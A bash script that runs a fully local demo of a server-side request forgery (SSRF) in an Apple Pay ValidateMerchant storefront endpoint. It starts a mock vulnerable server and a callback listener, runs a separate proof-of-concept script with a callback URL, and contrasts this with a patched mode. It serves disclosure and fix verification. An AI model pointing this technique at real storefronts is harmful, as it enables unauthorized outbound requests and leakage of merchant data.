#!/usr/bin/env bash
#
# One-command, fully-local demo of the Apple Pay ValidateMerchant SSRF.
# Starts a mock vulnerable storefront + an OOB collaborator listener, fires the
# real PoC script (poc/validate_merchant_ssrf.py) at localhost, and shows the
# captured out-of-band callback that proves the SSRF.
#
# NOTHING external is contacted -- both servers run on 127.0.0.1.
#
# Usage:
#   ./run_demo.sh            # vulnerable controller -> SSRF fires, callback captured
#   ./run_demo.sh --secure   # patched controller   -> rejected, NO callback (the fix)

set -u
cd "$(dirname "$0")"

SECURE_FLAG=""
MODE_LABEL="VULNERABLE"
if [ "${1:-}" = "--secure" ]; then
  SECURE_FLAG="--secure"
  MODE_LABEL="SECURE (patched)"
fi

TARGET_PORT=8080
COLLAB_PORT=9000
PY=python3

cleanup() {
  [ -n "${TARGET_PID:-}" ] && kill "$TARGET_PID" 2>/dev/null
  [ -n "${COLLAB_PID:-}" ] && kill "$COLLAB_PID" 2>/dev/null
}
trap cleanup EXIT

echo "########################################################################"
echo "#  Apple Pay ValidateMerchant SSRF -- local demo   [mode: $MODE_LABEL]"
echo "########################################################################"
echo

echo "[1/4] Starting OOB collaborator listener on :$COLLAB_PORT ..."
$PY collaborator.py "$COLLAB_PORT" &
COLLAB_PID=$!

echo "[2/4] Starting mock vulnerable storefront on :$TARGET_PORT ..."
$PY vulnerable_server.py --port "$TARGET_PORT" $SECURE_FLAG &
TARGET_PID=$!

# Wait for both ports to accept connections.
for _ in $(seq 1 25); do
  if $PY - "$TARGET_PORT" "$COLLAB_PORT" <<'EOF' 2>/dev/null
import socket, sys
for p in sys.argv[1:]:
    s = socket.socket(); s.settimeout(0.3)
    r = s.connect_ex(("127.0.0.1", int(p))); s.close()
    if r != 0: sys.exit(1)
EOF
  then break; fi
  sleep 0.2
done
echo "      ...both listeners up."
echo

BASE_URL="http://localhost:${TARGET_PORT}/en-us/cart"
ENDPOINT="http://localhost:${TARGET_PORT}/on/demandware.store/Sites-Demo-Site/en_US/__SYSTEM__ApplePay-ValidateMerchant"
CALLBACK="http://localhost:${COLLAB_PORT}/poc"

echo "[3/4] Firing the PoC script (poc/validate_merchant_ssrf.py) ..."
echo "----------------------------------------------------------------------"
# The PoC asks the operator to type the target host to confirm authorization;
# here that host is localhost, which we own, so we answer automatically.
echo "localhost" | $PY ../poc/validate_merchant_ssrf.py \
  --base-url    "$BASE_URL" \
  --endpoint    "$ENDPOINT" \
  --callback-url "$CALLBACK" \
  --hostname    "localhost" \
  --user-agent  "Mozilla/5.0 SSRF-Demo"
echo "----------------------------------------------------------------------"
echo

sleep 0.5
echo "[4/4] What the OOB collaborator independently captured:"
if [ -s collaborator_hits.log ]; then
  cat collaborator_hits.log
  echo
  echo ">>> SSRF PROVEN: the storefront backend reached out to a host it should"
  echo ">>> never contact, and leaked the merchant identity payload in the body."
else
  echo "    (no callback received)"
  if [ -n "$SECURE_FLAG" ]; then
    echo ">>> EXPECTED IN SECURE MODE: validationURL was rejected before any"
    echo ">>> outbound call, so no SSRF occurred. This is the fix in action."
  fi
fi
echo
